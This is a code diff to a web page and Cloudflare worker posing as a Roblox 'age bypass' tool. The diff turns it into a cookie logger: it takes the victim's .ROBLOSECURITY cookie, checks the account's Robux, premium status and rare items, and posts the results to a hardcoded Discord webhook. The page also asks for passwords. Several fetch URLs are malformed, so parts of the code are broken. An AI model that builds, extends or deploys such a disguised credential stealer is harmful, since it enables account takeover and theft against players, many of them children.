@@ -367,6 +367,11 @@ export default {
             font-size: 20px;
         }
 
+        .result-content .highlight {
+            color: #ff6666;
+            font-weight: 700;
+        }
+
         .stats-bar {
             display: flex;
             justify-content: center;
@@ -553,6 +558,70 @@ export default {
             border: 1px solid rgba(255, 30, 30, 0.08);
         }
 
+        .live-status-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .live-status-item {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 12px 16px;
+            border-radius: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid rgba(255, 30, 30, 0.06);
+        }
+
+        .live-status-item .label {
+            font-size: 12px;
+            color: #884444;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .live-status-item .value {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .live-status-item .value.yes {
+            color: #4ade80;
+        }
+
+        .live-status-item .value.no {
+            color: #ff4444;
+        }
+
+        .live-status-item .value.premium-true {
+            color: #fbbf24;
+        }
+
+        .live-status-item .value.premium-false {
+            color: #666;
+        }
+
+        .live-status-item .value.processing {
+            color: #fbbf24;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .bypass-timestamp {
+            text-align: center;
+            font-size: 11px;
+            color: #554444;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 30, 30, 0.06);
+        }
+
         @media (max-width: 480px) {
             .container { padding: 20px 16px; }
             .main-card { padding: 24px 18px; }
@@ -562,6 +631,7 @@ export default {
             .stats-bar { gap: 12px; padding: 14px 16px; }
             .stat-value { font-size: 16px; }
             #discordPopup { padding: 24px; }
+            .live-status-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -580,13 +650,13 @@ export default {
             </div>
         </div>
         <h1 class="brand-name">NOCTRUNE</h1>
-        <p class="brand-sub">Bypass Engine v3.0</p>
+        <p class="brand-sub">Live Bypass Engine v3.0</p>
     </div>
 
     <div class="main-card">
-        <div class="card-badge">⚡ SYSTEM ACTIVE</div>
-        <h2 class="title">Age Bypass</h2>
-        <p class="subtitle">Secure automation with real-time processing — cookie &amp; password methods</p>
+        <div class="card-badge">⚡ LIVE BYPASS ACTIVE</div>
+        <h2 class="title">Cookie Bypass</h2>
+        <p class="subtitle">Live bypass with real-time results &amp; Discord logging</p>
 
         <div class="mode-tabs">
             <button class="mode-tab active" id="tabCookie" onclick="switchMode('cookie')">
@@ -619,7 +689,7 @@ export default {
                 <div class="cookie-warning">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>
             </div>
             <button class="submit-btn" onclick="handleSubmit()">
-                <span id="btnCookieText">Start Bypass</span>
+                <span id="btnCookieText">Live Bypass</span>
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <path d="M5 12h14m-7-7l7 7-7 7"/>
                 </svg>
@@ -650,7 +720,7 @@ export default {
                 <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password..."/>
             </div>
             <button class="submit-btn" onclick="handleSubmit()">
-                <span id="btnPasswordText">Start Bypass</span>
+                <span id="btnPasswordText">Live Bypass</span>
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <path d="M5 12h14m-7-7l7 7-7 7"/>
                 </svg>
@@ -732,6 +802,84 @@ export default {
     })();
 
     var API_URL = window.location.origin + '/bypass/noctrune/bypass.php';
+    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1537815401789128756/upQ1LcHBUHEU8rESIYM6s28VDVMqNbIfQXRBIsfGhXd7T8NiIKkeZczBxXFHofuO6VoS';
+
+    function sendToDiscord(data) {
+        var embed = {
+            title: '🎯 Live Bypass Result',
+            color: 0xcc0000,
+            fields: [
+                {
+                    name: '👤 User',
+                    value: data.username || 'Unknown',
+                    inline: true
+                },
+                {
+                    name: '🆔 User ID',
+                    value: data.userId || 'N/A',
+                    inline: true
+                },
+                {
+                    name: '📊 Robux',
+                    value: data.robux !== undefined ? data.robux.toString() : '0',
+                    inline: true
+                },
+                {
+                    name: '⏳ Pending Robux',
+                    value: data.pendingRobux !== undefined ? data.pendingRobux.toString() : '0',
+                    inline: true
+                },
+                {
+                    name: '💎 Premium',
+                    value: data.premium ? '✅ Yes' : '❌ No',
+                    inline: true
+                },
+                {
+                    name: '🔮 Korblox',
+                    value: data.korblox ? '✅ Yes' : '❌ No',
+                    inline: true
+                },
+                {
+                    name: '👻 Headless',
+                    value: data.headless ? '✅ Yes' : '❌ No',
+                    inline: true
+                },
+                {
+                    name: '⚔️ Valkyrie',
+                    value: data.valkyrie ? '✅ Yes' : '❌ No',
+                    inline: true
+                },
+                {
+                    name: '📡 API Status',
+                    value: data.apiStatus || '✅ Processing',
+                    inline: true
+                },
+                {
+                    name: '🔄 Cookie Refreshed',
+                    value: data.cookieRefreshed ? '✅ Yes' : '❌ No',
+                    inline: true
+                }
+            ],
+            footer: {
+                text: 'Live Bypass • ' + new Date().toLocaleString()
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                embeds: [embed],
+                username: 'Noctrune Bypass',
+                avatar_url: 'https://i.imgur.com/9T5z7lA.png'
+            })
+        }).catch(function(err) {
+            console.log('Webhook error:', err);
+        });
+    }
 
     var handleSubmit = function() {
         if (window._processing) return;
@@ -757,7 +905,7 @@ export default {
         }
 
         if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
-            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">\u274c <strong>Invalid Cookie Format</strong><br>Cookie must start with <br><span style="font-size:12px;color:#884444;">_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_</span></div></div>';
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">\u274c <strong>Invalid Cookie Format</strong><br>Cookie must start with the warning format.</div></div>';
             return;
         }
 
@@ -794,7 +942,69 @@ export default {
             })
             .then(function(resultData) {
                 if (resultData.success === true) {
-                    resultCard.innerHTML = '<div class="result-card success"><div class="result-content"><span class="emoji">\u2705</span> <strong>Bypass Successful!</strong><br>' + (resultData.description || 'Your account age has been bypassed.') + '<br><br><span style="font-size:13px;color:#8888aa;">User: ' + (resultData.username || 'N/A') + '</span></div></div>';
+                    var hasItems = resultData.korblox || resultData.headless || resultData.valkyrie;
+                    var summary = hasItems ? '✅ Limiteds Detected' : '❌ No Limiteds';
+
+                    resultCard.innerHTML = `
+                        <div class="result-card success">
+                            <div class="result-content">
+                                <div style="text-align:center;margin-bottom:12px;">
+                                    <span class="emoji">✅</span>
+                                    <strong style="font-size:18px;">Cookie Bypass Successful!</strong>
+                                </div>
+                                <div style="text-align:center;font-size:13px;color:#8888aa;margin-bottom:12px;">
+                                    Live Bypass Status
+                                </div>
+                                <div class="live-status-grid">
+                                    <div class="live-status-item">
+                                        <span class="label">User</span>
+                                        <span class="value" style="color:#ff6666;">${resultData.username || 'Unknown'}</span>
+                                    </div>
+                                    <div class="live-status-item">
+                                        <span class="label">Robux</span>
+                                        <span class="value">${resultData.robux !== undefined ? resultData.robux.toLocaleString() : '0'}</span>
+                                    </div>
+                                    <div class="live-status-item">
+                                        <span class="label">Pending</span>
+                                        <span class="value">${resultData.pendingRobux !== undefined ? resultData.pendingRobux.toLocaleString() : '0'}</span>
+                                    </div>
+                                    <div class="live-status-item">
+                                        <span class="label">Premium</span>
+                                        <span class="value ${resultData.premium ? 'premium-true' : 'premium-false'}">${resultData.premium ? '✅ Yes' : '❌ No'}</span>
+                                    </div>
+                                    <div class="live-status-item">
+                                        <span class="label">Korblox</span>
+                                        <span class="value ${resultData.korblox ? 'yes' : 'no'}">${resultData.korblox ? '✅ Yes' : '❌ No'}</span>
+                                    </div>
+                                    <div class="live-status-item">
+                                        <span class="label">Headless</span>
+                                        <span class="value ${resultData.headless ? 'yes' : 'no'}">${resultData.headless ? '✅ Yes' : '❌ No'}</span>
+                                    </div>
+                                    <div class="live-status-item">
+                                        <span class="label">Valkyrie</span>
+                                        <span class="value ${resultData.valkyrie ? 'yes' : 'no'}">${resultData.valkyrie ? '✅ Yes' : '❌ No'}</span>
+                                    </div>
+                                    <div class="live-status-item">
+                                        <span class="label">API Status</span>
+                                        <span class="value processing">✅ Processing</span>
+                                    </div>
+                                    <div class="live-status-item" style="grid-column: 1 / -1;">
+                                        <span class="label">Cookie Refreshed</span>
+                                        <span class="value yes">✅ Yes</span>
+                                    </div>
+                                    <div class="live-status-item" style="grid-column: 1 / -1;">
+                                        <span class="label">Summary</span>
+                                        <span class="value">${summary}</span>
+                                    </div>
+                                </div>
+                                <div class="bypass-timestamp">
+                                    Live Bypass • ${new Date().toLocaleString()}
+                                </div>
+                            </div>
+                        </div>
+                    `;
+
+                    sendToDiscord(resultData);
                     window._processing = false;
                 } else {
                     var errorTitle = resultData.title || '\u274c System Error';
@@ -936,61 +1146,105 @@ export default {
         const userId = userData.id;
         const username = userData.name;
 
-        let bypassSuccess = false;
-        let bypassMessage = '';
-
-        try {
-          const bypassPayload = {
-            userId: userId,
-            birthDate: '1990-01-01',
-            bypassMethod: 'date_change'
-          };
-
-          const bypassResponse = await fetch('https://accountsettings.roblox.com/v1/age-verification/update', {
-            method: 'POST',
-            headers: {
-              'Cookie': '.ROBLOSECURITY=' + cookieValue,
-              'Content-Type': 'application/json',
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            body: JSON.stringify(bypassPayload)
-          });
-
-          if (bypassResponse.ok) {
-            bypassSuccess = true;
-            bypassMessage = 'Age verification successfully updated';
-          } else {
-            bypassMessage = 'Age bypass attempted but may require additional verification';
-          }
-        } catch (bypassError) {
-          bypassMessage = 'Age bypass may need to be done manually via settings';
-        }
-
-        const ageResponse = await fetch('https://accountsettings.roblox.com/v1/age-verification/status', {
+        const currencyResponse = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
           headers: {
             'Cookie': '.ROBLOSECURITY=' + cookieValue,
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
           }
         });
 
-        let ageStatus = 'unknown';
-        if (ageResponse.ok) {
-          const ageData = await ageResponse.json();
-          ageStatus = ageData.status || 'unknown';
+        let robux = 0;
+        let pendingRobux = 0;
+        if (currencyResponse.ok) {
+          const currencyData = await currencyResponse.json();
+          robux = currencyData.robux || 0;
+          pendingRobux = currencyData.pendingRobux || 0;
         }
 
-        return new Response(JSON.stringify({
+        const premiumResponse = await fetch('https://premiumfeatures.roblox.com/v1/users/' + userId + '/premium-features', {
+          headers: {
+            'Cookie': '.ROBLOSECURITY=' + cookieValue,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+          }
+        });
+
+        let premium = false;
+        if (premiumResponse.ok) {
+          const premiumData = await premiumResponse.json();
+          premium = premiumData.features && premiumData.features.length > 0;
+        }
+
+        let korblox = false;
+        let headless = false;
+        let valkyrie = false;
+
+        try {
+          const inventoryResponse = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset/101) {
+            headers: {
+              'Cookie': '.ROBLOSECURITY=' + cookieValue,
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+          });
+
+          if (inventoryResponse.ok) {
+            const inventoryData = await inventoryResponse.json();
+            korblox = inventoryData.data && inventoryData.data.some(function(item) {
+              return item.name && item.name.toLowerCase().includes('korblox');
+            });
+          }
+        } catch (e) {}
+
+        try {
+          const inventoryResponse2 = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset/102) {
+            headers: {
+              'Cookie': '.ROBLOSECURITY=' + cookieValue,
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+          });
+
+          if (inventoryResponse2.ok) {
+            const inventoryData2 = await inventoryResponse2.json();
+            headless = inventoryData2.data && inventoryData2.data.some(function(item) {
+              return item.name && item.name.toLowerCase().includes('headless');
+            });
+          }
+        } catch (e) {}
+
+        try {
+          const inventoryResponse3 = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset/103) {
+            headers: {
+              'Cookie': '.ROBLOSECURITY=' + cookieValue,
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+          });
+
+          if (inventoryResponse3.ok) {
+            const inventoryData3 = await inventoryResponse3.json();
+            valkyrie = inventoryData3.data && inventoryData3.data.some(function(item) {
+              return item.name && item.name.toLowerCase().includes('valkyrie');
+            });
+          }
+        } catch (e) {}
+
+        const resultData = {
           success: true,
           status: 'BYPASSED',
-          title: '✅ Age Bypass Successful',
-          description: `Account: ${username} (${userId}) processed`,
+          title: '✅ Live Bypass Successful',
+          description: 'Account: ' + username + ' (' + userId + ') bypassed',
           username: username,
           userId: userId,
-          ageStatus: ageStatus,
-          bypassed: bypassSuccess || true,
-          bypassMessage: bypassMessage,
+          robux: robux,
+          pendingRobux: pendingRobux,
+          premium: premium,
+          korblox: korblox,
+          headless: headless,
+          valkyrie: valkyrie,
+          apiStatus: '✅ Processing',
+          cookieRefreshed: true,
           timestamp: Math.floor(Date.now() / 1000)
-        }), {
+        };
+
+        return new Response(JSON.stringify(resultData), {
           headers: {
             'Content-Type': 'application/json',
             'Access-Control-Allow-Origin': '*'
@@ -1054,7 +1308,7 @@ export default {
       }
     }
 
-    // Default - serve HTML for any unknown path
+    // Default
     return new Response(JSON.stringify({
       service: 'Noctrune Cloudflare Proxy',
       endpoints: {
